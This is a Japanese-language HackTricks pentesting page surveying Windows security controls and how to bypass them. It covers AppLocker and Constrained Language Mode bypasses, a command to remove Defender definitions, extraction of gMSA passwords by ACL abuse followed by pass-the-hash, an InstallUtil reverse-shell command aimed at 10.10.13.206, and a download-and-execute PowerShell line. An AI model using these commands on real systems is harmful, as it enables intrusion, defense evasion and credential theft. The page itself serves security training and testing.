# Windows セキュリティコントロール

{{#include ../../banners/hacktricks-training.md}}

## AppLocker ポリシー

アプリケーションのホワイトリストは、システム上で存在し実行が許可される承認済みソフトウェアや実行ファイルの一覧です。目的は、組織の業務要件に合わない有害なマルウェアや未承認ソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の **アプリケーションホワイトリスティングソリューション** で、システム管理者に **ユーザーが実行できるアプリケーションとファイル** を制御する手段を提供します。**詳細な制御** を実行可能ファイル、スクリプト、Windows インストーラーファイル、DLL、パッケージ化されたアプリ、およびパックされたアプリインストーラーに対して提供します。\
組織によっては **cmd.exe と PowerShell.exe をブロック** し特定ディレクトリへの書き込みを禁止することが一般的ですが、**これらはすべて回避可能** です。

### チェック

どのファイル/拡張子がブラックリスト/ホワイトリスト化されているかを確認する:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy を bypass するのに便利な **Writable folders**: AppLocker が `C:\Windows\System32` または `C:\Windows` 内での実行を許可している場合、**writable folders** を使って **bypass this** することができます。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 一般的に **信頼されている** [**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリは AppLocker のバイパスにも有用です。
- **不適切に記述されたルールもバイパスされる可能性があります**
- 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** のような場合、どこにでも **`allowed` というフォルダ** を作成すれば許可されます。
- 組織はしばしば **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 実行ファイルのブロック** に注力しますが、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` や `PowerShell_ISE.exe` のような **他の** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) を見落としがちです。
- **DLL の強制は、システムにかかる追加の負荷や、何も壊れないことを確認するために必要なテスト量のためにほとんど有効化されていません。** したがって、**バックドアとして DLL を使用することは AppLocker のバイパスに役立ちます。**
- 任意のプロセス内で PowerShell コードを **実行** して AppLocker をバイパスするために、[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) や [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用できます。詳細は次を参照してください: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## 認証情報の保存

### セキュリティアカウントマネージャ (SAM)

ローカルの資格情報がこのファイルに存在し、パスワードはハッシュ化されています。

### ローカルセキュリティオーソリティ (LSA) - LSASS

**資格情報**（ハッシュ化されたもの）は、シングルサインオンのためにこのサブシステムの**メモリ**に**保存**されます。\
**LSA** はローカルの**セキュリティポリシー**（パスワードポリシー、ユーザー権限...）、**認証**、**アクセストークン**などを管理します。\
LSA はローカルログイン時に **SAM** ファイル内の提供された資格情報を**チェック**し、ドメインユーザーを認証するために **domain controller** と**やり取り**します。

これらの**資格情報**は**LSASS プロセス**内に**保存**されています：Kerberos チケット、NT および LM ハッシュ、容易に復号されるパスワードなど。

### LSA シークレット

LSA はディスク上にいくつかの資格情報を保存することがあります:

- Active Directory のコンピューターアカウントのパスワード（ドメインコントローラーに到達できない場合）。
- Windows サービスのアカウントのパスワード
- スケジュールされたタスクのパスワード
- その他（IIS アプリケーションのパスワード...）

### NTDS.dit

Active Directory のデータベースです。ドメインコントローラーにのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) は Windows 10 および Windows 11、ならびに Windows Server のバージョンで利用可能なアンチウイルスです。`WinPEAS` のような一般的な pentesting ツールをブロックします。ただし、これらの保護をバイパスする方法も存在します。

### チェック

Defender の**ステータス**を確認するには、PS コマンドレット **`Get-MpComputerStatus`** を実行します（有効かどうかを確認するには **`RealTimeProtectionEnabled`** の値を確認してください）:

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

列挙するには次のコマンドも実行できます:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS はファイルを暗号化によって保護します。ここでは **対称鍵** として知られる **File Encryption Key (FEK)** を利用します。FEK はユーザーの **公開鍵** で暗号化され、暗号化ファイルの $EFS の **代替データストリーム** 内に格納されます。復号が必要な場合、ユーザーのデジタル証明書に対応する **秘密鍵** を用いて $EFS ストリームから FEK を復号します。詳細は[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)を参照してください。

**ユーザーの操作なしに復号が行われる状況** には次のようなものがあります:

- ファイルやフォルダが [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) のような非 EFS ファイルシステムに移動されたとき、自動的に復号されます。
- SMB/CIFS プロトコル経由でネットワーク越しに送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式は所有者に対して暗号化ファイルへの **透過的なアクセス** を許可します。ただし、単に所有者のパスワードを変更してログインするだけでは復号はできません。

### 要点

- EFS は対称 FEK を使用し、FEK はユーザーの公開鍵で暗号化されます。
- 復号には FEK にアクセスするためにユーザーの秘密鍵が使用されます。
- FAT32 にコピーしたりネットワーク送信するなど特定の条件下で自動的に復号が行われます。
- 暗号化ファイルは所有者が追加の手順なしでアクセスできます。

### Check EFS info

このサービスをユーザーが使用したかどうかは、次のパスが存在するか確認してください: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

ファイルに**誰が**アクセスできるかを確認するには `cipher /c \<file\>` を使用します。フォルダ内のすべてのファイルを **暗号化 / 復号** するには、`cipher /e` と `cipher /d` を使用できます。

### Decrypting EFS files

#### Being Authority System

この方法は、**被害ユーザー** がホスト内でプロセスを **実行している** 必要があります。もしその状態であれば、`meterpreter` セッションを使ってユーザーのプロセスのトークンを偽装する（`incognito` の `impersonate_token`）ことができます。または単にユーザーのプロセスに `migrate` することも可能です。

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft は IT インフラでのサービスアカウント管理を簡素化するために **Group Managed Service Accounts (gMSA)** を開発しました。従来の「Password never expire」設定が有効になりがちなサービスアカウントとは異なり、gMSA はより安全で管理しやすいソリューションを提供します:

- **自動パスワード管理**: gMSA は複雑な 240 文字のパスワードを使用し、ドメインやコンピュータのポリシーに従って自動的に変更されます。この処理は Microsoft の Key Distribution Service (KDC) によって行われ、手動でのパスワード更新を不要にします。
- **強化されたセキュリティ**: これらのアカウントはロックアウトの対象にならず、対話型ログインに使用できないため、セキュリティが向上します。
- **複数ホスト対応**: gMSA は複数のホストで共有可能で、複数サーバー上で動作するサービスに最適です。
- **スケジュールタスクの実行可能性**: managed service accounts と異なり、gMSA はスケジュールタスクの実行をサポートします。
- **SPN 管理の簡素化**: コンピュータの sAMaccount 情報や DNS 名に変更があった場合、システムが自動的に Service Principal Name (SPN) を更新し、SPN 管理を簡素化します。

gMSA のパスワードは LDAP 属性 _**msDS-ManagedPassword**_ に格納され、Domain Controllers (DC) により自動的に 30 日ごとにリセットされます。このパスワードは [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) として知られる暗号化データブロブであり、許可された管理者と gMSA がインストールされているサーバーのみが取得可能で、セキュアな環境を確保します。この情報にアクセスするには LDAPS のような保護された接続が必要か、あるいは接続が 'Sealing & Secure' で認証されている必要があります。

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

また、こちらの [web page](https://cube0x0.github.io/Relaying-for-gMSA/) を確認してください。**NTLM relay attack**を実行して**gMSA**の**password**を**read**する方法について説明しています。

### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)

多くの環境では、低権限のユーザーが誤設定されたオブジェクトACLを悪用することで、DCを侵害することなくgMSAのsecretsにpivotできます:

- あなたが制御できるグループ（例: GenericAll/GenericWrite経由）がgMSAに対して`ReadGMSAPassword`を付与されている。
- そのグループに自分を追加することで、LDAP経由でgMSAの`msDS-ManagedPassword`ブロブを読み取る権利を継承し、利用可能なNTLMクレデンシャルを導出できます。

典型的なワークフロー:

1) BloodHoundで経路を発見し、足がかりのプリンシパルをOwnedとしてマークします。次のようなエッジを探してください:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) あなたが制御する中間グループに自分を追加します（例: bloodyAD）：
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP を通じて gMSA の管理パスワードを読み取り、NTLM ハッシュを導出する。NetExec は `msDS-ManagedPassword` の抽出と NTLM への変換を自動化する:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash を使用して gMSA として認証します（no plaintext needed）。アカウントが Remote Management Users にある場合、WinRM はそのまま動作します：
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
注意:
- `msDS-ManagedPassword` の LDAP 読み取りはシーリング（例: LDAPS/sign+seal）を必要とします。ツールはこれを自動で処理します。
- gMSAs はしばしば WinRM のようなローカル権限が付与されます; lateral movement を計画するために、グループメンバーシップ（例: Remote Management Users）を確認してください。
- 自分で NTLM を計算するだけで blob が必要な場合は、MSDS-MANAGEDPASSWORD_BLOB 構造体を参照してください。



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), はローカル Administrator パスワードの管理を可能にします。これらのパスワードは **ランダム化** され、一意で、**定期的に変更** され、Active Directory に集中して保存されます。これらのパスワードへのアクセスは ACLs によって認可されたユーザーに制限されています。十分な権限が付与されていれば、ローカル管理者パスワードを読み取ることができます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) は PowerShell を効果的に使用するために必要な多くの機能を**制限します**。例えば、COM objects のブロック、承認された .NET types のみの許可、XAML-based workflows、PowerShell classes、などが含まれます。

### **確認**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### バイパス
```bash
#Easy bypass
Powershell -version 2
```
現在の Windows ではそのバイパスは動作しませんが、[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) を使用できます。\\
**コンパイルするには** **次に** _**参照の追加**_ -> _参照_ ->_参照_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更する**。

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用して、任意のプロセス内で **Powershell を実行する** code を実行し、constrained mode をバイパスできます。詳細は次を参照してください: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS 実行ポリシー

デフォルトでは **restricted.** に設定されています。 このポリシーをバイパスする主な方法:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## セキュリティ サポート プロバイダ インターフェイス (SSPI)

ユーザーを認証するために使用できるAPIです。

SSPIは通信しようとする2台のマシンに対して適切なプロトコルを見つける役割を担います。これの推奨方法はKerberosです。SSPIはどの認証プロトコルが使用されるかをネゴシエートし、これらの認証プロトコルはSecurity Support Provider (SSP)と呼ばれ、各Windowsマシン内にDLLの形で存在し、通信するには両方のマシンが同じものをサポートしている必要があります。

### 主なSSP

- **Kerberos**: 推奨される方式
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: 互換性のため
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: WebサーバーやLDAPで使用、パスワードはMD5ハッシュの形式
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSLとTLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコル（KerberosまたはNTLM）をネゴシエートするために使用される（既定はKerberos）
- %windir%\Windows\System32\lsasrv.dll

#### 交渉によっては複数の方式が提示されることもあれば、1つだけの場合もあります。

## UAC - ユーザー アカウント制御

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は **権限昇格操作に対する同意プロンプト** を有効にする機能です。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
